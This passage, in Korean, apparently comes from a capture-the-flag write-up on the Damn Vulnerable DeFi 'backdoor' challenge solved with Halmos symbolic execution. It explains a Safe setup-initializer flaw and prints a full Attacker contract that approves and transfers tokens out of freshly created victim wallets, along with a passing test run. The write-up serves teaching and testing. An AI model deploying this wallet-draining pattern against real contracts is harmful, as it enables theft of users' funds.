### simulateAndRevert 함수
**safe-smart-account**의 이 함수를 살펴봅시다:
```solidity
function simulateAndRevert(address targetContract, bytes memory calldataPayload) external {
    // solhint-disable-next-line no-inline-assembly
    assembly {
        let success := delegatecall(gas(), targetContract, add(calldataPayload, 0x20), mload(calldataPayload), 0, 0)

        mstore(0x00, success)
        mstore(0x20, returndatasize())
        returndatacopy(0x40, 0, returndatasize())
        revert(0, add(returndatasize(), 0x40))
    }
}
```
이것은 부작용을 피하도록 보장하는 방식으로 만들어졌습니다. 아무것도 아닌 것으로 이어지는 것이 보장된 전체 심볼릭 호출 트리를 생성할 수 있으므로, 최적화를 위해 단순히 비활성화할 것입니다:
```solidity
glob.add_banned_function_selector(bytes4(keccak256("simulateAndRevert(address,bytes)")));
```
## 반례 분석 (Counterexample analysis)
이 단계에서 2가지 뉴스가 있습니다: 좋은 소식과 나쁜 소식.

나쁜 소식: 테스트를 실행하고 12시간 동안 작동하게 둔 후에도, 제 머신에서는 여전히 완료할 수 없었습니다. 그것은 재귀 때문이 아닙니다. 설정이 정말 매우 추상적이고 경로 폭발로 이어지기 쉽습니다. 그리고 상기시켜 드릐자면, 우리는 **SymbolicAttacker**에서 단 하나의 공격 트랜잭션만 실행합니다.

좋은 소식: 약 40분 후, 유효한 반례를 생성하기 시작합니다:
```javascript
halmos --solver-timeout-assertion 0 --solver-timeout-branching 0 --function check_backdoor --loop 100
...
WARNING  Counterexample (potentially invalid):
             halmos_attack_target_address_d611c7d_01 = 0x00000000000000000000000000000000aaaa0003
             halmos_handle_delegatecall_target_address_3d06944_127 = 0x00000000000000000000000000000000aaaa0005  
             halmos_handle_delegatecall_target_address_c8e86a1_56 = 0x00000000000000000000000000000000aaaa0004
             halmos_selector_bytes4_107807b_143 = approve
             halmos_selector_bytes4_531278b_55 = execTransaction
             halmos_selector_bytes4_2b46211_126 = setup
             halmos_selector_bytes4_ce3956b_72 = createProxyWithCallback
             halmos_symbolic_spender_address_4a8d582_144 = 0x0020040000000000000000000000000400000000
             p__owners[0]_address_fad3a48_110 = 0x00000000000000000000000000000000000000000000000000000000cafe0003
             p__owners_length_10bdd7d_109 = 0x0000000000000000000000000000000000000000000000000000000000000001
             p__singleton_address_6e025f6_63 = 0x00000000000000000000000000000000000000000000000000000000aaaa0003
             p__threshold_uint256_02c5463_112 = 0x0000000000000000000000000000000000000000000000000000000000000001
             p_amount_uint256_f09a3f6_130 = 0x0000000000000000000000000000000000000000000000000000000000000001
             p_baseGas_uint256_b1e9294_17 = 0x0000000000000000000000000000000000000000000000000000000000000000
             p_callback_address_3b906f4_67 = 0x00000000000000000000000000000000000000000000000000000000aaaa0006
             p_data_bytes_4cafaa8_13 = 0x00...00                                                                                                          
             p_data_length_df2cef7_14 = 0x0000000000000000000000000000000000000000000000000000000000000400
             p_data_length_f72314b_115 = 0x0000000000000000000000000000000000000000000000000000000000000400
             p_fallbackHandler_address_9d46cfe_116 = 0x0000000000000000000000000000000000000000000000000000000000000000
             p_gasPrice_uint256_1b8c476_18 = 0x0000000000000000200000000000000000000000000000000000000000000000
             p_gasToken_address_124a4c5_19 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
             p_initializer_bytes_35bf1c5_64 =0xb63e800d00000000000...00
             p_initializer_length_27402fc_65 = 0x0000000000000000000000000000000000000000000000000000000000000400
             p_operation_uint8_7c66862_15 = 0x0000000000000000000000000000000000000000000000000000000000000001
             p_paymentReceiver_address_95e4d39_119 = 0x00000000000000000000000000000000000000000000000000000000bbbb0020
             p_paymentToken_address_79464f1_117 = 0x0000000000000000000000000000000000000000000000000000000000000000
             p_payment_uint256_985362d_118 = 0x7ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc
             p_refundReceiver_address_dd44e1b_20 = 0x0000000000000000000000000000000000000000000000000000000000000001
             p_safeTxGas_uint256_f825f64_16 = 0x0000000000000000000000000000000000000000000000000000000000000001
             p_saltNonce_uint256_eeb7667_66 = 0x0000000000000000000000000000000000000000000000000000000000000000
             p_signatures_length_2d407bc_22 = 0x0000000000000000000000000000000000000000000000000000000000000400
             p_spender_address_93cdbf9_129 = 0x0000000000000000000000000020040000000000000000000000000400000000
             p_to_address_7a0345f_113 = 0x00000000000000000000000000000000000000000000000000000000aaaa0007
             p_to_address_b19e0c9_11 = 0x00000000000000000000000000000000000000000000000000000000aaaa0007
             p_value_uint256_41861fd_12 = 0x0000000000000000000000000000000000000000000000000000000000000000
             ...
```
이 반례는 많은 노이즈를 포함하고 있지만, 그 안에서 버그의 본질을 추출할 수 있습니다. 누구나 **Alice**를 위한 **Safe** 지갑을 만들 수 있습니다. 하지만 동시에 생성 과정에서, 공격자는 `setup()`을 사용하고 적절한 코드를 `initializer`로 전달함으로써 **Alice**의 **SafeProxy**를 대신하여 절대적으로 어떤 코드든 호출할 수 있습니다. 그래서 Halmos는 **SafeProxy**가 어떤 `symbolic_spender`에 대해 `approve`를 실행하도록 강제했고, 그로 인해 `allowance`가 없다는 불변 조건을 깨뜨렸습니다.

사실 이것만으로도 공격 시나리오가 명백해집니다: **Alice**, **Bob**, **Charlie**, **David**를 위한 **Safe** 지갑을 생성할 때, 우리가 제어하는 컨트랙트에 대해 `approve`를 만들고 새로 생성된 지갑에서 자금을 인출합니다.

참고로 이 공격을 위해 **Safe** 컨트랙트를 프록시로 사용하는 것은 선택 사항입니다. 단지 Halmos가 그러한 방법을 찾았을 뿐입니다.

## 공격 생성
Attacker:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";
import "../../src/backdoor/WalletRegistry.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";

contract Attacker {
    DamnValuableToken token;
    SafeProxyFactory factory;
    WalletRegistry registry;
    address singleton;
    address recovery;

    constructor(DamnValuableToken _token, 
                SafeProxyFactory _factory, 
                WalletRegistry _registry, 
                address _singleton, 
                address _recovery) {
        token = _token;
        factory = _factory;
        registry = _registry;
        singleton = _singleton;
        recovery = _recovery;
    }

    function handle_delegatecall(DamnValuableToken _token, address attacker) public {
        _token.approve(attacker, 10e18);
    }

    function attack(address[] calldata users) public {
        for (uint i = 0; i < 4; i++){
            address[] memory owners = new address[](1);
            owners[0] = users[i];
            bytes memory attacking_data = abi.encodeCall(
                this.handle_delegatecall, (token, address(this)));

            bytes memory initializer = abi.encodeCall(
                Safe.setup,
                (
                    owners,
                    1,
                    address(this),
                    attacking_data,
                    address(0),
                    address(0),
                    0,
                    payable(address(0))
                )
            );

            SafeProxy wallet = factory.createProxyWithCallback(singleton, initializer, 1, IProxyCreationCallback(registry));

            token.transferFrom(address(wallet), recovery, 10e18);
        }
    }
}
```
`test_backdoor`:
```solidity
function test_backdoor() public checkSolvedByPlayer {
    Attacker attacker = new Attacker(token, walletFactory, walletRegistry, address(singletonCopy), recovery);
    attacker.attack(users);
}
```
실행:
```javascript
$ forge test --mp test/backdoor/Backdoor.t.sol
...
Ran 2 tests for test/backdoor/Backdoor.t.sol:BackdoorChallenge
[PASS] test_assertInitialState() (gas: 62853)
[PASS] test_backdoor() (gas: 2167005)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 9.43ms (1.69ms CPU time)      
```
성공!

## 퍼징은?
전통에 따르면, 퍼징 엔진이 현재 문제에서 작동하도록 "네모난 못을 둥근 구멍에 맞추려는" 노력이 있어야 합니다. 하지만 사실, 우리는 이것에서 어떤 "학문적 새로움"도 찾을 것 같지 않습니다. 우리는 이미 높은 수준의 추상화가 있는 작업에서 Echidna가 어떻게 행동하는지, 그리고 [selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie#fuzzing-vs-selfie)의 예에서 문제를 해결하기 위해 준비하는 것이 얼마나 부자연스럽고 불편하며 심지어 "사기"처럼 보이는지 보았습니다. 따라서 이 글에서는 저 자신이나 독자를 고문하지 않을 것이며, 퍼징을 통한 해결책 찾기를 포기할 것입니다. 하지만 퍼징을 통한 우아한 해결책이 존재한다면 기꺼이 살펴보고 싶습니다. 제 결론이 틀렸다면 기쁠 것입니다 :D.

## 결론
1. Halmos는 추상화로 과부하된 컨트랙트의 경우에도 강력한 도구임이 입증되었습니다. 중요한 것은 코드 커버리지를 꼼꼼하게 처리하고 휴리스틱을 통한 최적화를 능숙하게 사용하는 것입니다.
2. 기사에서 보여준 것처럼 특별한 `handle_delegatecall` 접근 방식을 통해 심볼릭 `delegatecalls`를 처리하는 것이 매우 편리하며 아마도 가장 정확할 것입니다.
3. `owners` 목록과 **SafeProxy**의 `fallback` 예에서 볼 수 있듯이, 때로는 Halmos가 대처할 수 있도록 타겟 컨트랙트의 일부 기능 구현 로직 자체를 변경해야 할 때가 있습니다.
4. 다시 한번, 타겟 컨트랙트의 비즈니스 로직을 기반으로 사용자 정의 불변 조건을 확인하는 것이 좋은 아이디어임을 확인합니다. 그러한 불변 조건(`allowance` 불변 조건)을 추가한 덕분에, 우리는 작업을 하나의 심볼릭 트랜잭션으로 완료했습니다.
5. Halmos는 때때로 높은 부하에서 비결정적으로 동작할 수 있습니다. 비낙관적(non-optimistic) 옵션을 사용하면 Halmos가 더 결정적으로 작동하도록 도울 수 있습니다.

## 다음 챌린지
이 시리즈의 다음 글은 [climber](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/climber)입니다.
